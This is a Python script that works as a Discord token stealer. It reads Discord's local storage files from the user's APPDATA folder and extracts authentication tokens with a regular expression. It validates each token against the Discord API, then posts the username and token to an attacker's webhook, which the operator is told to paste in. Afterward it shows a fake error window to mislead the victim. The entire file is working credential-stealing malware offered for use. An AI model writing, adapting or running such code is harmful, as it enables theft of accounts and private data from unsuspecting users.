import os
import requests
import re
import json
import tkinter

from tkinter import Label

window = tkinter.Tk()
########################################################
#           PASTE THE WEBHOOKLINK HERE!
webhook = 'WEBHOOK'
#           PASTE THE WEBHOOKLINK HERE!
########################################################
discdir = os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb'

def discsearch():
    for file in os.listdir(discdir):
        try:
            print(file)
            file = open(discdir+"\\"+file, "r", errors="ignore")
            content = file.read()
            tokens = re.findall("[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", content)
            for token in tokens:
                r = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token})
                if r.status_code == 200:
                    data = requests.get('https://discordapp.com/api/v7/users/@me', headers={"authorization":token}).json()
                    embed = {
                        "embeds": [
                            {
                                "title": 'Bruh!',
                                "color": 7506394,
                                "fields": [
                                    {
                                        "name": "Username",
                                        "value": f"{data['username']}#{data['discriminator']}"
                                    },
                                    {
                                        "name": "Token",
                                        "value": token
                                    },
                                ],
                            }
                        ]
                    }
                    requests.post(webhook, data=json.dumps(embed), headers={"Content-Type": "application/json"})
                    window.title("Error!")
                    window.geometry('200x100')
                    window.configure(bg="white")
                    window.resizable(width=False, height=False)
                    statustxt = tkinter.StringVar()
                    statustxt.set("Uh, there is an error! (8xez397)")
                    status = Label(window, textvariable=statustxt, bg="white", fg="black")
                    status.pack()
                    window.mainloop()
                    return

        except PermissionError:
            pass

if __name__ == "__main__":
    discsearch()